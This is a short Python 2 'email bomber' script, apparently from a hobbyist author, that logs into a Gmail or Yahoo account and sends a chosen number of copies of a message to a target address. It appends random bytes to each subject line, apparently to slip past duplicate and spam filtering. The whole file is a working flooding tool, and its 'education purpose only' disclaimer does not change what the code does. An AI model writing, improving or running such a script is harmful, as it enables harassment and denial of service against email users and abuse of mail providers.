#!/usr/bin/python
#E-Bomber
#This code for education purpose only.
#Use it at your own risk !!!
#s3xy_n00b

import os
import smtplib
import getpass
import sys

print("""
		::::::::::::::::::::::::::::::::::::::
		:       E M A I L   B O M B E R      :
		:------------------------------------:
		:       Author :   S3XY N00B         :
		: Contact : https://m.me/s3xy.n00b.1 :
		:::::::::::::::::::::::::::::::::::::: """)


server = raw_input ('MailServer Gmail/Yahoo: ')
user = raw_input('Email: ')
passwd = getpass.getpass('Password: ')

to = raw_input('\nTo: ')
subjectA = raw_input('Subject: ') 
body = raw_input('Message: ')
total = input('Number of send: ')

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    print 'Applies only to gmail and yahoo.'
    sys.exit()

print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subjectB = os.urandom(5)
	subject = subjectA + " " + subjectB
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
        server.sendmail(user,to,msg)
        print "\rE-mails sent: %i" % i
        sys.stdout.flush()
    server.quit()
    print '\n Done !!!'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] The username or password you entered is incorrect.'
    sys.exit()
